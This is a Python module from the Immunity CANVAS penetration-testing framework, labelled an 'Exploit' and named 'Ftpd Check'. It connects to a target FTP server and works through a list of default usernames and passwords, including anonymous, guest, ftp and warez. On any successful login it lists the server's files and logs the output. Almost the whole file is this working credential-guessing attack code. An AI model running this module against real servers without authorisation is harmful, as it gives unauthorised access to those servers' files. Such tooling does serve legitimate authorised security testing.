#! /usr/bin/env python

#
# CANVAS  Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


import os,getopt
import socket
from exploitutils import *


from tcpexploit import tcpexploit
import canvasengine
import time

NAME="Ftpd Check"
DESCRIPTION="Checks an FTP server for remote access with a few default usernames"
DOCUMENTATION={}

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] , ["Linux"], ["Solaris"], ["AIX"] ]

NOTES="""

    
"""

CHANGELOG="""

"""

    

    

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=21
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring="\x00"
        self.version=1
        self.name=NAME        
        return

    
    def test(self):
        """
        
        """
        self.getargs()
        
        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        return 1
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))        
        
    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        self.log("Attacking %s:%d"%(self.host,self.port))
        
        # Save sometime from brute forcing if the port is not open
        if(self.ftplogin()==0):
            self.log("Port is not open we will not attempt a brute force")
            return 1
        
        logins=[("Anonymous","bob@bob.com"),("test","test"),("anonymous", "test@test.com"), ("guest","guest"),("ftp", "ftp"), ("warez","warez")]
        loggedin=0
        self.result=None
        for login in logins:
            self.user=login[0]
            self.password=login[1]
            s=self.ftplogin()
            if s:
                loggedin=1
                self.log("Logged into ftp server at %s with %s:%s"%(self.host,self.user,self.password))
                try:
                    s.sendall("NLST\r\n")
                except:
                    self.log("Connection reset - is there a HIDS/AV on our machine or an IPS in the way?")
                    continue
                recvdata=[]
                data="A"
                while data!="":
                    try:
                        data=prettyprint(s.recv(5000))
                    except:
                        data=""
                    recvdata+=[data]
                data="".join(recvdata)
                self.log("Recved: %s"%data)
                if data:
                    self.result=data
        return loggedin
        


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
